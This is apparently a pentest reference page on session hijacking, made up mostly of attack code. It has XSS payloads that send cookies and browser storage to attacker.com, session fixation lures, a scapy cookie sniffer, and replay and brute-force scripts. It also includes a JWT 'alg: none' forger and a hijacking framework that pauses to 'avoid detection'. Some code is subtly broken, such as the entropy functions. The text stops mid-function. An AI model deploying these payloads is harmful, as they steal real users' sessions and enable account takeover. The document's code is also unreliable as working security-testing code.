# Session Hijacking - Topics Overview

## Topic Explanation
Session Hijacking is the process of taking control of an active user session by stealing or predicting session identifiers (Session IDs). After a user authenticates with valid credentials, the server assigns a unique session ID that is typically stored in cookies or URL parameters. Attackers can exploit weak session management, insecure transmission, or predictable session ID generation to gain unauthorized access to user accounts without knowing their credentials. This attack allows attackers to impersonate legitimate users and access sensitive data or perform actions on their behalf. Understanding session hijacking techniques, prevention methods, and secure session management is crucial for web application security.

## Articles for Further Reference
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [NIST Special Publication 800-63B: Authentication and Lifecycle Management](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [RFC 6265: HTTP State Management Mechanism (Cookies)](https://tools.ietf.org/html/rfc6265)
- [SANS Institute: Session Hijacking Attacks](https://www.sans.org/white-papers/1081/)
- [Web Application Security Consortium: Session Fixation](http://www.webappsec.org/projects/threat/classes/session_fixation.shtml)

## Reference Links
- [OWASP Session Hijacking Attack](https://owasp.org/www-community/attacks/Session_hijacking_attack)
- [OWASP Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [MITRE ATT&CK - Session Hijacking](https://attack.mitre.org/techniques/T1185/)
- [PortSwigger Web Security Academy - Session Management](https://portswigger.net/web-security/authentication/securing)
- [Mozilla Developer Network - HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

## Available Tools for the Topic

### Tool Name: Burp Suite
**Description:** Comprehensive web application security testing platform with tools for intercepting, analyzing, and manipulating HTTP traffic including session tokens.

**Example Usage:**
```bash
# Start Burp Suite Professional
burpsuite

# Configure browser proxy settings to use Burp (127.0.0.1:8080)
# Navigate to Target tab and set scope
# Use Proxy tab to intercept and modify requests
# Analyze session tokens in Sequencer tool
# Test for session fixation in Repeater
```

**Reference Links:**
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Burp Suite Session Analysis](https://portswigger.net/burp/documentation/desktop/tools/sequencer)

### Tool Name: OWASP ZAP (Zed Attack Proxy)
**Description:** Open-source web application security scanner that can identify session management vulnerabilities and perform session hijacking tests.

**Example Usage:**
```bash
# Start ZAP
zap.sh

# Set up proxy (localhost:8080)
# Configure target application
# Run automated scan
# Analyze session token entropy
# Test for session fixation vulnerabilities

# Command line usage
zap-cli start
zap-cli open-url http://target-application.com
zap-cli spider http://target-application.com
zap-cli active-scan http://target-application.com
```

**Reference Links:**
- [OWASP ZAP Documentation](https://www.zaproxy.org/docs/)
- [ZAP Session Management Testing](https://www.zaproxy.org/docs/desktop/addons/session-management-add-on/)

### Tool Name: Wireshark
**Description:** Network protocol analyzer that can capture and analyze network traffic to extract session cookies and tokens transmitted over the network.

**Example Usage:**
```bash
# Start Wireshark
wireshark

# Capture traffic on network interface
# Filter HTTP traffic: http
# Filter for specific cookies: http contains "JSESSIONID"
# Follow HTTP streams to analyze session flow
# Export HTTP objects to extract session data

# Command line with tshark
tshark -i eth0 -f "tcp port 80" -Y "http.cookie" -T fields -e http.cookie
```

**Reference Links:**
- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html_chunked/)
- [Wireshark HTTP Analysis](https://wiki.wireshark.org/HTTP)

### Tool Name: Cookie Cadger
**Description:** Auditing tool for session management that passively captures and replays session cookies to identify insecure implementations.

**Example Usage:**
```bash
# Start Cookie Cadger
java -jar CookieCadger.jar

# Configure wireless interface for monitoring
# Capture session cookies from network traffic
# Replay cookies to test session hijacking
# Analyze cookie security attributes
```

**Reference Links:**
- [Cookie Cadger Documentation](https://www.cookiecadger.com/)

### Tool Name: Hamster & Ferret
**Description:** Tool suite for session hijacking and sidejacking that captures cookies from wireless networks and allows session replay.

**Example Usage:**
```bash
# Start Ferret to capture cookies
ferret -i wlan0

# Start Hamster to replay sessions
hamster

# Access Hamster web interface at http://localhost:1234
# Browse captured sessions and cookies
# Click on sessions to replay them
```

**Reference Links:**
- [Hamster & Ferret Documentation](http://hamster.erratasec.com/)

### Tool Name: Firesheep
**Description:** Firefox extension (now deprecated) that demonstrated session hijacking on unsecured wireless networks by capturing and replaying session cookies.

**Example Usage:**
```bash
# Historical tool - no longer maintained
# Demonstrated session sidejacking on open WiFi networks
# Captured login sessions for social media sites
# Allowed one-click session hijacking
```

**Reference Links:**
- [Firesheep Historical Documentation](https://github.com/codebutler/firesheep)

## All Possible Payloads for Manual Approach

### Session ID Prediction Attacks
```python
# Sequential session ID prediction
def predict_sequential_session_id(current_session):
    """Predict next session ID if using sequential generation"""
    if current_session.isdigit():
        next_id = str(int(current_session) + 1)
        return next_id.zfill(len(current_session))
    return None

# Time-based session ID prediction
import time
def predict_time_based_session_id():
    """Generate session IDs based on timestamp"""
    timestamp = int(time.time())
    return str(timestamp)

# Weak random session ID prediction
import random
def weak_session_id_generation():
    """Demonstrate weak session ID generation"""
    # Poor randomness - predictable
    random.seed(int(time.time()))
    return str(random.randint(100000, 999999))
```

### Cross-Site Scripting (XSS) Cookie Theft
```javascript
// Basic cookie theft via XSS
<script>
document.location = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>

// Advanced cookie theft with steganography
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/collect.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('cookies=' + encodeURIComponent(document.cookie) + 
         '&url=' + encodeURIComponent(window.location.href) +
         '&referrer=' + encodeURIComponent(document.referrer));
</script>

// Cookie theft with image technique
<script>
var img = new Image();
img.src = 'http://attacker.com/log.php?cookie=' + escape(document.cookie);
</script>

// Advanced persistent cookie theft
<script>
setInterval(function() {
    if (document.cookie) {
        fetch('http://attacker.com/harvest.php', {
            method: 'POST',
            body: JSON.stringify({
                cookies: document.cookie,
                sessionStorage: JSON.stringify(sessionStorage),
                localStorage: JSON.stringify(localStorage),
                timestamp: new Date().toISOString(),
                page: window.location.href
            }),
            headers: {
                'Content-Type': 'application/json'
            }
        });
    }
}, 30000); // Check every 30 seconds
</script>
```

### Session Fixation Attack Payloads
```html
<!-- Session fixation via URL parameter -->
<a href="http://target-site.com/login?JSESSIONID=ATTACKER_CONTROLLED_SESSION_ID">
    Click here to login securely
</a>

<!-- Session fixation via form -->
<form action="http://target-site.com/login" method="POST">
    <input type="hidden" name="session_id" value="FIXED_SESSION_ID">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>

<!-- Session fixation via meta refresh -->
<meta http-equiv="refresh" content="0; url=http://target-site.com/login?sid=ATTACKER_SESSION_ID">
```

### Man-in-the-Middle Session Interception
```python
#!/usr/bin/env python3
from scapy.all import *
import re

def extract_session_cookies(packet):
    """Extract session cookies from HTTP traffic"""
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        
        # Look for Set-Cookie headers
        cookie_pattern = r'Set-Cookie:\s*([^;]+)'
        cookies = re.findall(cookie_pattern, payload, re.IGNORECASE)
        
        # Look for session-related cookies
        session_patterns = [
            r'JSESSIONID=([^;]+)',
            r'PHPSESSID=([^;]+)', 
            r'ASPSESSIONID=([^;]+)',
            r'session_id=([^;]+)',
            r'auth_token=([^;]+)'
        ]
        
        for cookie in cookies:
            for pattern in session_patterns:
                match = re.search(pattern, cookie, re.IGNORECASE)
                if match:
                    print(f"Session cookie found: {match.group(0)}")
                    print(f"Source: {packet[IP].src}")
                    print(f"Destination: {packet[IP].dst}")
                    
                    # Save for replay
                    with open('captured_sessions.txt', 'a') as f:
                        f.write(f"{packet[IP].src},{match.group(0)}\n")

# Sniff HTTP traffic for session cookies
sniff(filter="tcp port 80", prn=extract_session_cookies)
```

### Session Replay Attack Scripts
```python
#!/usr/bin/env python3
import requests
import json

class SessionReplayAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def replay_session_cookie(self, cookie_value, cookie_name="JSESSIONID"):
        """Replay captured session cookie"""
        # Set the stolen session cookie
        self.session.cookies.set(cookie_name, cookie_value)
        
        try:
            # Access protected resource
            response = self.session.get(f"{self.target_url}/dashboard")
            
            if response.status_code == 200:
                print(f"Session hijack successful!")
                print(f"Response length: {len(response.text)}")
                
                # Look for user-specific content
                if "welcome" in response.text.lower() or "profile" in response.text.lower():
                    print("Found user-specific content - session valid!")
                    return True
            else:
                print(f"Session replay failed: {response.status_code}")
                
        except Exception as e:
            print(f"Error during session replay: {e}")
        
        return False
    
    def test_multiple_sessions(self, session_file):
        """Test multiple captured session cookies"""
        successful_hijacks = 0
        
        with open(session_file, 'r') as f:
            for line in f:
                if ',' in line:
                    ip, cookie_data = line.strip().split(',', 1)
                    
                    # Extract cookie name and value
                    if '=' in cookie_data:
                        cookie_name, cookie_value = cookie_data.split('=', 1)
                        
                        print(f"Testing session from {ip}: {cookie_name}={cookie_value[:20]}...")
                        
                        if self.replay_session_cookie(cookie_value, cookie_name):
                            successful_hijacks += 1
                            print(f"Successful hijack from {ip}")
        
        print(f"Successfully hijacked {successful_hijacks} sessions")

# Example usage
if __name__ == "__main__":
    replay_attack = SessionReplayAttack("http://target-application.com")
    replay_attack.test_multiple_sessions("captured_sessions.txt")
```

## Example Payloads

### 1. Comprehensive Session Hijacking Framework
```python
#!/usr/bin/env python3
import requests
import re
import time
import threading
import hashlib
import random
from scapy.all import *

class SessionHijackingFramework:
    def __init__(self, target_url):
        self.target_url = target_url
        self.captured_sessions = {}
        self.active_sessions = []
        self.monitoring = False
        
    def analyze_session_security(self):
        """Analyze session management security"""
        print("Analyzing session management security...")
        
        # Test session ID generation
        session_ids = []
        for i in range(10):
            response = requests.get(f"{self.target_url}/login")
            
            # Extract session ID from Set-Cookie header
            if 'Set-Cookie' in response.headers:
                cookie_header = response.headers['Set-Cookie']
                session_match = re.search(r'(\w+)=([^;]+)', cookie_header)
                if session_match:
                    session_ids.append(session_match.group(2))
            
            time.sleep(0.5)
        
        # Analyze session ID patterns
        self.analyze_session_patterns(session_ids)
        
        # Test for session fixation
        self.test_session_fixation()
        
        # Test for secure cookie attributes
        self.test_cookie_security()
    
    def analyze_session_patterns(self, session_ids):
        """Analyze session ID generation patterns"""
        print(f"\nAnalyzing {len(session_ids)} session IDs...")
        
        # Check for sequential patterns
        numeric_ids = []
        for sid in session_ids:
            if sid.isdigit():
                numeric_ids.append(int(sid))
        
        if len(numeric_ids) > 1:
            differences = [numeric_ids[i+1] - numeric_ids[i] for i in range(len(numeric_ids)-1)]
            if all(d == differences[0] for d in differences):
                print(f"WARNING: Sequential session IDs detected! Increment: {differences[0]}")
        
        # Check for timestamp-based patterns
        current_time = int(time.time())
        for sid in session_ids:
            if sid.isdigit() and abs(int(sid) - current_time) < 3600:  # Within 1 hour
                print(f"WARNING: Timestamp-based session ID detected: {sid}")
        
        # Calculate entropy
        entropy = self.calculate_entropy(session_ids)
        print(f"Session ID entropy: {entropy:.2f} bits")
        
        if entropy < 64:
            print("WARNING: Low session ID entropy - vulnerable to brute force")
    
    def calculate_entropy(self, session_ids):
        """Calculate entropy of session IDs"""
        if not session_ids:
            return 0
        
        # Combine all session IDs and calculate character frequency
        combined = ''.join(session_ids)
        char_counts = {}
        
        for char in combined:
            char_counts[char] = char_counts.get(char, 0) + 1
        
        # Calculate Shannon entropy
        entropy = 0
        total_chars = len(combined)
        
        for count in char_counts.values():
            probability = count / total_chars
            entropy -= probability * (probability.bit_length() - 1)
        
        return entropy * len(session_ids[0]) if session_ids else 0
    
    def test_session_fixation(self):
        """Test for session fixation vulnerability"""
        print("\nTesting for session fixation...")
        
        # Get initial session
        session = requests.Session()
        response = session.get(f"{self.target_url}/login")
        
        initial_cookies = session.cookies.get_dict()
        print(f"Initial cookies: {initial_cookies}")
        
        # Attempt login with fixed session
        login_data = {
            'username': 'testuser',
            'password': 'testpass'
        }
        
        login_response = session.post(f"{self.target_url}/login", data=login_data)
        post_login_cookies = session.cookies.get_dict()
        
        print(f"Post-login cookies: {post_login_cookies}")
        
        # Check if session ID changed after authentication
        if initial_cookies == post_login_cookies:
            print("WARNING: Session fixation vulnerability detected!")
            print("Session ID did not change after authentication")
        else:
            print("Session ID properly regenerated after login")
    
    def test_cookie_security(self):
        """Test cookie security attributes"""
        print("\nTesting cookie security attributes...")
        
        response = requests.get(f"{self.target_url}/login")
        
        if 'Set-Cookie' in response.headers:
            cookie_header = response.headers['Set-Cookie']
            print(f"Cookie header: {cookie_header}")
            
            # Check for HttpOnly flag
            if 'HttpOnly' not in cookie_header:
                print("WARNING: Session cookie missing HttpOnly flag")
            
            # Check for Secure flag
            if 'Secure' not in cookie_header:
                print("WARNING: Session cookie missing Secure flag")
            
            # Check for SameSite attribute
            if 'SameSite' not in cookie_header:
                print("WARNING: Session cookie missing SameSite attribute")
            
            # Check cookie expiration
            if 'Expires' not in cookie_header and 'Max-Age' not in cookie_header:
                print("INFO: Session cookie is session-only (no expiration)")
    
    def passive_session_capture(self, interface="eth0", duration=60):
        """Passively capture session cookies from network traffic"""
        print(f"Starting passive session capture on {interface} for {duration} seconds...")
        
        def packet_handler(packet):
            if packet.haslayer(Raw) and packet.haslayer(IP):
                try:
                    payload = packet[Raw].load.decode('utf-8', errors='ignore')
                    
                    # Look for Cookie headers in requests
                    cookie_match = re.search(r'Cookie:\s*([^\r\n]+)', payload)
                    if cookie_match:
                        cookies = cookie_match.group(1)
                        src_ip = packet[IP].src
                        
                        # Extract session-related cookies
                        session_cookies = self.extract_session_cookies(cookies)
                        if session_cookies:
                            self.captured_sessions[src_ip] = session_cookies
                            print(f"Captured session from {src_ip}: {session_cookies}")
                    
                    # Look for Set-Cookie headers in responses
                    setcookie_match = re.search(r'Set-Cookie:\s*([^\r\n]+)', payload)
                    if setcookie_match:
                        cookie = setcookie_match.group(1)
                        dst_ip = packet[IP].dst
                        
                        session_cookies = self.extract_session_cookies(cookie)
                        if session_cookies:
                            print(f"Server setting session for {dst_ip}: {session_cookies}")
                
                except UnicodeDecodeError:
                    pass
        
        # Start packet capture
        self.monitoring = True
        sniff(iface=interface, prn=packet_handler, timeout=duration, filter="tcp port 80")
        self.monitoring = False
        
        print(f"Captured {len(self.captured_sessions)} unique sessions")
    
    def extract_session_cookies(self, cookie_string):
        """Extract session-related cookies from cookie string"""
        session_patterns = [
            r'JSESSIONID=([^;]+)',
            r'PHPSESSID=([^;]+)',
            r'ASPSESSIONID[^=]*=([^;]+)',
            r'session_id=([^;]+)',
            r'sessionid=([^;]+)',
            r'auth_token=([^;]+)',
            r'login_token=([^;]+)'
        ]
        
        found_sessions = {}
        for pattern in session_patterns:
            match = re.search(pattern, cookie_string, re.IGNORECASE)
            if match:
                cookie_name = pattern.split('=')[0].replace(r'\w+', 'SESSION').replace('[^=]*', '')
                found_sessions[cookie_name] = match.group(1)
        
        return found_sessions
    
    def replay_captured_sessions(self):
        """Replay captured session cookies"""
        print("\nReplaying captured sessions...")
        
        successful_hijacks = 0
        total_attempts = 0
        
        for src_ip, sessions in self.captured_sessions.items():
            for cookie_name, cookie_value in sessions.items():
                total_attempts += 1
                print(f"Testing session from {src_ip}: {cookie_name}={cookie_value[:20]}...")
                
                if self.attempt_session_hijack(cookie_name, cookie_value):
                    successful_hijacks += 1
                    print(f"SUCCESS: Hijacked session from {src_ip}")
                    
                    # Test what we can access
                    self.enumerate_hijacked_session(cookie_name, cookie_value)
                
                time.sleep(1)  # Avoid detection
        
        print(f"\nHijacking Results: {successful_hijacks}/{total_attempts} successful")
    
    def attempt_session_hijack(self, cookie_name, cookie_value):
        """Attempt to hijack a specific session"""
        session = requests.Session()
        session.cookies.set(cookie_name, cookie_value)
        
        # Test access to protected resources
        test_endpoints = [
            '/dashboard',
            '/profile',
            '/account',
            '/admin',
            '/settings'
        ]
        
        for endpoint in test_endpoints:
            try:
                response = session.get(f"{self.target_url}{endpoint}")
                
                # Check for successful access
                if response.status_code == 200:
                    content = response.text.lower()
                    success_indicators = [
                        'welcome', 'dashboard', 'logout', 'profile',
                        'account', 'settings', 'admin panel'
                    ]
                    
                    if any(indicator in content for indicator in success_indicators):
                        return True
                        
            except requests.RequestException:
                continue
        
        return False
    
    def enumerate_hijacked_session(self, cookie_name, cookie_value):
        """Enumerate what's accessible with hijacked session"""
        session = requests.Session()
        session.cookies.set(cookie_name, cookie_value)
        
        print("  Enumerating accessible resources...")
        
        endpoints_to_test = [
            '/profile',
            '/settings', 
            '/account',
            '/admin',
            '/users',
            '/api/user',
            '/api/settings',
            '/dashboard/stats'
        ]
        
        accessible_endpoints = []
        
        for endpoint in endpoints_to_test:
            try:
                response = session.get(f"{self.target_url}{endpoint}")
                if response.status_code == 200:
                    accessible_endpoints.append(endpoint)
                    
                    # Extract useful information
                    if 'email' in response.text.lower():
                        email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text)
                        if email_match:
                            print(f"    Found email: {email_match.group()}")
                    
                    if 'username' in response.text.lower():
                        username_match = re.search(r'"username"\s*:\s*"([^"]+)"', response.text)
                        if username_match:
                            print(f"    Found username: {username_match.group(1)}")
                            
            except requests.RequestException:
                continue
        
        print(f"    Accessible endpoints: {accessible_endpoints}")
    
    def generate_session_wordlist(self, count=1000):
        """Generate session ID wordlist for brute force attacks"""
        print(f"Generating session ID wordlist with {count} entries...")
        
        session_ids = []
        
        # Common session ID patterns
        for i in range(count // 4):
            # Sequential numeric
            session_ids.append(str(i).zfill(8))
            
            # Timestamp-based
            timestamp = int(time.time()) + random.randint(-3600, 3600)
            session_ids.append(str(timestamp))
            
            # MD5 hash of predictable input
            predictable = f"session{i}"
            session_ids.append(hashlib.md5(predictable.encode()).hexdigest())
            
            # Weak random (based on time)
            random.seed(timestamp)
            weak_random = ''.join(random.choices('0123456789ABCDEF', k=32))
            session_ids.append(weak_random)
        
        # Save to file
        with open('session_wordlist.txt', 'w') as f:
            for sid in session_ids:
                f.write(f"{sid}\n")
        
        print("Session ID wordlist saved to 'session_wordlist.txt'")
        return session_ids
    
    def brute_force_session_ids(self, wordlist_file='session_wordlist.txt'):
        """Brute force session IDs using wordlist"""
        print("Starting session ID brute force attack...")
        
        try:
            with open(wordlist_file, 'r') as f:
                session_ids = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print("Wordlist file not found, generating one...")
            session_ids = self.generate_session_wordlist()
        
        successful_sessions = []
        
        for i, session_id in enumerate(session_ids):
            if i % 100 == 0:
                print(f"Progress: {i}/{len(session_ids)} ({i/len(session_ids)*100:.1f}%)")
            
            # Test common cookie names
            cookie_names = ['JSESSIONID', 'PHPSESSID', 'sessionid', 'session_id']
            
            for cookie_name in cookie_names:
                if self.attempt_session_hijack(cookie_name, session_id):
                    successful_sessions.append((cookie_name, session_id))
                    print(f"FOUND VALID SESSION: {cookie_name}={session_id}")
                    break
            
            time.sleep(0.1)  # Rate limiting
        
        print(f"Brute force completed. Found {len(successful_sessions)} valid sessions.")
        return successful_sessions

# Example usage
if __name__ == "__main__":
    target = "http://vulnerable-app.com"
    
    framework = SessionHijackingFramework(target)
    
    print("=== SESSION HIJACKING FRAMEWORK ===")
    print(f"Target: {target}")
    print()
    
    # Phase 1: Analyze session security
    framework.analyze_session_security()
    
    # Phase 2: Passive session capture (simulated)
    # framework.passive_session_capture(duration=30)
    
    # Phase 3: Session replay attacks
    # framework.replay_captured_sessions()
    
    # Phase 4: Session ID brute force
    # framework.brute_force_session_ids()
    
    print("\nSession hijacking assessment completed.")
```

### 2. Advanced Cookie Manipulation Toolkit
```python
#!/usr/bin/env python3
import requests
import base64
import json
import jwt
import hashlib
import hmac
import time
from urllib.parse import quote, unquote

class CookieManipulationToolkit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def decode_cookie_value(self, cookie_value):
        """Decode various cookie encoding formats"""
        decoded_results = {}
        
        # Base64 decoding
        try:
            base64_decoded = base64.b64decode(cookie_value + '==').decode('utf-8')
            decoded_results['base64'] = base64_decoded
        except:
            pass
        
        # URL decoding
        try:
            url_decoded = unquote(cookie_value)
            decoded_results['url'] = url_decoded
        except:
            pass
        
        # Hex decoding
        try:
            if all(c in '0123456789abcdefABCDEF' for c in cookie_value):
                hex_decoded = bytes.fromhex(cookie_value).decode('utf-8')
                decoded_results['hex'] = hex_decoded
        except:
            pass
        
        # JWT token parsing
        if cookie_value.count('.') == 2:
            try:
                jwt_decoded = jwt.decode(cookie_value, options={"verify_signature": False})
                decoded_results['jwt'] = jwt_decoded
            except:
                pass
        
        # JSON parsing
        try:
            json_decoded = json.loads(cookie_value)
            decoded_results['json'] = json_decoded
        except:
            pass
        
        return decoded_results
    
    def analyze_cookie_structure(self, cookie_value):
        """Analyze cookie structure and identify patterns"""
        analysis = {
            'length': len(cookie_value),
            'character_set': set(cookie_value),
            'entropy': self.calculate_entropy(cookie_value),
            'patterns': []
        }
        
        # Check for common patterns
        if cookie_value.isdigit():
            analysis['patterns'].append('numeric')
        
        if cookie_value.isalnum():
            analysis['patterns'].append('alphanumeric')
        
        if '=' in cookie_value or cookie_value.endswith('='):
            analysis['patterns'].append('base64_padding')
        
        if len(cookie_value) == 32 and all(c in '0123456789abcdef' for c in cookie_value.lower()):
            analysis['patterns'].append('md5_hash')
        
        if len(cookie_value) == 40 and all(c in '0123456789abcdef' for c in cookie_value.lower()):
            analysis['patterns'].append('sha1_hash')
        
        # Check for timestamp patterns
        if cookie_value.isdigit() and len(cookie_value) == 10:
            timestamp = int(cookie_value)
            if 1000000000 < timestamp < 2000000000:  # Reasonable timestamp range
                analysis['patterns'].append('unix_timestamp')
                analysis['timestamp'] = time.ctime(timestamp)
        
        return analysis
    
    def calculate_entropy(self, data):
        """Calculate Shannon entropy of data"""
        if not data:
            return 0
        
        char_counts = {}
        for char in data:
            char_counts[char] = char_counts.get(char, 0) + 1
        
        entropy = 0
        data_len = len(data)
        
        for count in char_counts.values():
            probability = count / data_len
            entropy -= probability * (probability.bit_length() - 1) if probability > 0 else 0
        
        return entropy
    
    def test_cookie_tampering(self, original_cookie_name, original_cookie_value):
        """Test various cookie tampering techniques"""
        print(f"Testing cookie tampering for {original_cookie_name}={original_cookie_value}")
        
        # Decode the original cookie
        decoded = self.decode_cookie_value(original_cookie_value)
        print(f"Decoded formats: {decoded}")
        
        # Analyze structure
        analysis = self.analyze_cookie_structure(original_cookie_value)
        print(f"Cookie analysis: {analysis}")
        
        tampering_results = []
        
        # Test 1: Increment numeric values
        if 'numeric' in analysis['patterns']:
            new_value = str(int(original_cookie_value) + 1)
            result = self.test_tampered_cookie(original_cookie_name, new_value)
            tampering_results.append(('increment', new_value, result))
        
        # Test 2: Modify JWT claims
        if 'jwt' in decoded:
            modified_jwt = self.modify_jwt_cookie(original_cookie_value, decoded['jwt'])
            if modified_jwt:
                result = self.test_tampered_cookie(original_cookie_name, modified_jwt)
                tampering_results.append(('jwt_modify', modified_jwt, result))
        
        # Test 3: Base64 manipulation
        if 'base64' in decoded:
            modified_b64 = self.modify_base64_cookie(original_cookie_value, decoded['base64'])
            if modified_b64:
                result = self.test_tampered_cookie(original_cookie_name, modified_b64)
                tampering_results.append(('base64_modify', modified_b64, result))
        
        # Test 4: Bit flipping
        bit_flipped = self.bit_flip_cookie(original_cookie_value)
        result = self.test_tampered_cookie(original_cookie_name, bit_flipped)
        tampering_results.append(('bit_flip', bit_flipped, result))
        
        # Test 5: Length extension
        extended = original_cookie_value + 'A'
        result = self.test_tampered_cookie(original_cookie_name, extended)
        tampering_results.append(('extend', extended, result))
        
        # Test 6: Truncation
        if len(original_cookie_value) > 5:
            truncated = original_cookie_value[:-1]
            result = self.test_tampered_cookie(original_cookie_name, truncated)
            tampering_results.append(('truncate', truncated, result))
        
        return tampering_results
    
    def modify_jwt_cookie(self, original_jwt, decoded_claims):
        """Modify JWT cookie claims"""
        try:
            # Common privilege escalation attempts
            modifications = [
                {'admin': True},
                {'role': 'admin'},
                {'user_id': 1},
                {'permissions': ['admin', 'read', 'write']},
                {'exp': int(time.time()) + 86400}  # Extend expiration
            ]
            
            for mod in modifications:
                modified_claims = decoded_claims.copy()
                modified_claims.update(mod)
                
                # Create unsigned JWT (algorithm: none)
                header = {'typ': 'JWT', 'alg': 'none'}
                header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                payload_b64 = base64.urlsafe_b64encode(json.dumps(modified_claims).encode()).decode().rstrip('=')
                
                # Create JWT without signature
                modified_jwt = f"{header_b64}.{payload_b64}."
                return modified_jwt
        except:
            pass
        return None
    
    def modify_base64_cookie(self, original_cookie, decoded_data):
        """Modify base64-encoded cookie data"""
        try:
            # Try to parse as JSON and modify
            if decoded_data.startswith('{') and decoded_data.endswith('}'):
                json_data = json.loads(decoded_data)
                
                # Common modifications
                if 'user_id' in json_data:
                    json_data['user_id'] = 1
                if 'role' in json_data:
                    json_data['role'] = 'admin'
                if 'admin' in json_data:
                    json_data['admin'] = True
                
                modified_json = json.dumps(json_data)
                modified_b64 = base64.b64encode(modified_json.encode()).decode()
                return modified_b64
        except:
            pass
        return None
    
    def bit_flip_cookie(self, cookie_value):
        """Perform bit flipping attack on cookie"""
        if len(cookie_value) > 10:
            # Flip a bit in the middle of the cookie
            mid_pos = len(cookie_value) // 2
            cookie_bytes = bytearray(cookie_value.encode())
            cookie_bytes[mid_pos] ^= 1  # Flip one bit
            return cookie_bytes.decode('utf-8', errors='ignore')
        return cookie_value
    
    def test_tampered_cookie(self, cookie_name, cookie_value):
        """Test tampered cookie value"""
        # Create new session with tampered cookie
        test_session = requests.Session()
        test_session.cookies.set(cookie_name, cookie_value)
        
        try:
            # Test access to protected resource
            response = test_session.get(f"{self.target_url}/dashboard")
            
            result = {
                'status_code': response.status_code,
                'success': response.status_code == 200,
                'content_length': len(response.text),
                'contains_error': 'error' in response.text.lower() or 'invalid' in response.text.lower()
            }
            
            # Check for privilege escalation indicators
            admin_indicators = ['admin', 'administrator', 'root', 'superuser']
            result['potential_privilege_escalation'] = any(
                indicator in response.text.lower() for indicator in admin_indicators
            )
            
            return result
        except:
            return {'success': False, 'error': True}
    
    def session_puzzle_attack(self, known_sessions):
        """Attempt to derive session generation algorithm"""
        print("Analyzing session generation patterns...")
        
        if len(known_sessions) < 3:
            print("Need at least 3 sessions for pattern analysis")
            return
        
        # Check for incremental patterns
        numeric_sessions = []
        for session in known_sessions:
            if session.isdigit():
                numeric_sessions.append(int(session))
        
        if len(numeric_sessions) >= 2:
            differences = [numeric_sessions[i+1] - numeric_sessions[i] 
                         for i in range(len(numeric_sessions)-1)]
            
            if all(d == differences[0] for d in differences):
                print(f"Sequential pattern detected! Increment: {differences[0]}")
                # Predict next session IDs
                next_session = numeric_sessions[-1] + differences[0]
                print(f"Predicted next session: {next_session}")
                return [str(next_session + i * differences[0]) for i in range(10)]
        
        # Check for timestamp patterns
        current_time = int(time.time())
        for session in known_sessions:
            if session.isdigit():
                session_time = int(session)
                if abs(session_time - current_time) < 86400:  # Within 24 hours
                    print(f"Timestamp-based session detected: {session}")
        
        # Check for hash patterns
        for session in known_sessions:
            if len(session) == 32:  # MD5 length
                print(f"Potential MD5 hash session: {session}")
            elif len(session) == 40:  # SHA1 length
                print(f"Potential SHA1 hash session: {session}")
        
        return []

# Example usage and testing framework
if __name__ == "__main__":
    target = "http://vulnerable-app.com"
    toolkit = CookieManipulationToolkit(target)
    
    # Example session cookies to analyze
    test_cookies = [
        ("JSESSIONID", "ABC123456789"),
        ("auth_token", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InRlc3QifQ.signature"),
        ("session_data", "eyJ1c2VyX2lkIjoyLCJyb2xlIjoidXNlciJ9"),  # Base64 encoded JSON
        ("user_session", "1609459200")  # Unix timestamp
    ]
    
    for cookie_name, cookie_value in test_cookies:
        print(f"\n{'='*60}")
        print(f"Analyzing cookie: {cookie_name}={cookie_value}")
        print('='*60)
        
        # Analyze and tamper with cookie
        results = toolkit.test_cookie_tampering(cookie_name, cookie_value)
        
        print("\nTampering Results:")
        for technique, modified_value, result in results:
            print(f"  {technique}: {result['success']} (Status: {result.get('status_code', 'N/A')})")
            if result.get('potential_privilege_escalation'):
                print(f"    ⚠️  Potential privilege escalation detected!")
    
    # Test session puzzle attack
    print(f"\n{'='*60}")
    print("Session Pattern Analysis")
    print('='*60)
    
    sample_sessions = ["1001", "1002", "1003", "1004", "1005"]
    predicted = toolkit.session_puzzle_attack(sample_sessions)
    if predicted:
        print(f"Predicted sessions: {predicted[:5]}")
```

### 3. Session Management Security Tester
```python
#!/usr/bin/env python3
import requests
import time
import threading
import random
import string
from datetime import datetime, timedelta

class SessionSecurityTester:
    def __init__(self, target_url, login_endpoint="/login"):
        self.target_url = target_url
        self.login_endpoint = login_endpoint
        self.test_credentials = [
            ("admin", "admin"),
            ("test", "test"),
            ("user", "password"),
            ("demo", "demo")
        ]
        self.vulnerabilities = []
    
    def test_session_management_security(self):
        """Run comprehensive session management security tests"""
        print("Starting comprehensive session management security tests...")
        
        # Test 1: Session ID randomness
        self.test_session_randomness()
        
        # Test 2: Session fixation
        self.test_session_fixation()
        
        # Test 3: Session timeout
        self.test_session_timeout()
        
        # Test 4: Concurrent sessions
        self.test_concurrent_sessions()
        
        # Test 5: Session invalidation on logout
        self.test_logout_invalidation()
        
        # Test 6: Cookie security attributes
        self.test_cookie_security_attributes()
        
        # Test 7: Session token exposure
        self.test_session_token_exposure()
        
        # Test 8: Cross-domain session sharing
        self.test_cross_domain_sessions()
        
        # Generate report
        self.generate_security_report()
    
    def test_session_randomness(self):
        """Test session ID randomness and predictability"""
        print("\nTesting session ID randomness...")
        
        session_ids = []
        timestamps = []
        
